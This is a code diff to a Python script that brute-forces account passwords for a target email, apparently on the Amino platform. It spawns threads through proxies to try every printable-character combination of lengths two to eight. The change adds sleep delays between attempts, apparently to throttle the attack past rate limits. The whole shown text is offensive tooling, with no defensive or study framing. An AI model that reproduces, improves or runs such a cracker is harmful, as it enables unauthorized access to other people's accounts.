@@ -247,6 +247,9 @@ else:
 			x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]),emailToUse,))
 
 			x.start()
+		time.sleep(2)
+
+	time.sleep(4)
 
 	print('Password Crack Attempt with Length of 3 ...')
 
@@ -258,6 +261,8 @@ else:
 				x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]),emailToUse,))
 
 				x.start()
+			time.sleep(2)
+		time.sleep(2)
 
 	print('Password Crack Attempt with Length of 4 ...')
 
@@ -270,6 +275,9 @@ else:
 					x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]),emailToUse,))
 
 					x.start()
+				time.sleep(2)
+			time.sleep(2)
+		time.sleep(2)
 
 	print('Password Crack Attempt with Length of 5 ...')
 
@@ -283,6 +291,10 @@ else:
 						x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]),emailToUse,))
 
 						x.start()
+					time.sleep(2)
+				time.sleep(2)
+			time.sleep(2)
+		time.sleep(2)
 
 	print('Password Crack Attempt with Length of 6 ...')
 
@@ -297,6 +309,11 @@ else:
 							x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]+list(string.printable)[yy]),emailToUse,))
 
 							x.start()
+						time.sleep(2)
+					time.sleep(2)
+				time.sleep(2)
+			time.sleep(2)
+		time.sleep(2)
 
 	print('Password Crack Attempt with Length of 7 ...')
 
@@ -312,6 +329,12 @@ else:
 								x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]+list(string.printable)[yy]+list(string.printable)[zz]),emailToUse,))
 
 								x.start()
+							time.sleep(2)
+						time.sleep(2)
+					time.sleep(2)
+				time.sleep(2)
+			time.sleep(2)
+		time.sleep(2)
 
 	print('Password Crack Attempt with Length of 8 ...')
 
@@ -328,3 +351,10 @@ else:
 									x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]+list(string.printable)[yy]+list(string.printable)[zz]+list(string.printable)[bb]),emailToUse,))
 
 									x.start()
+								time.sleep(2)
+							time.sleep(2)
+						time.sleep(2)
+					time.sleep(2)
+				time.sleep(2)
+			time.sleep(2)
+		time.sleep(2)
